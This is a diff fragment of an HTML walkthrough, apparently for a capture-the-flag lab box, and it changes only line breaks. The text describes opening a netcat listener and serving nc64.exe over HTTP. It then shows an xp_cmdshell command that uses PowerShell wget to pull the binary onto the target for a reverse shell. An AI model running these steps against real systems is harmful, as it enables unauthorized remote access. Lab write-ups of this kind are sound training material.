@@ -95,11 +95,11 @@ Now, we will attempt to get a stable reverse shell.<br><br>
 We will upload the <code>nc64.exe</code> binary to the target machine and execute an interactive cmd.exe process on our listening port.<br>
 You can download the binary from <a href="https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------">here</a>.<br>
 <b>cmd</b>：<code>nc -lvnp 443</code><br>
-<b>cmd</b>：<code>python3 -m http.server 80</code><br><br>
+<b>cmd</b>：<code>python3 -m http.server 80</code><br>
 
 As a user archetype/sql_svc , we don't have enough privileges to upload files in a system directory and
 only user Administrator can perform actions with higher privileges.<br>
-We need to change the current working directory somewhere in the home directory of our user where it will be possible to write.<br>
+We need to change the current working directory somewhere in the home directory of our user where it will be possible to write.<br><br>
 After a quick enumeration we found that Downloads is working perfectly for us to place our binary.<br>
 In order to do that, we are going to use the wget tool within PowerShell:<br>
 <code>xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://&lt;target_ip&gt;/nc64.exe -outfile nc64.exe"</code><br>
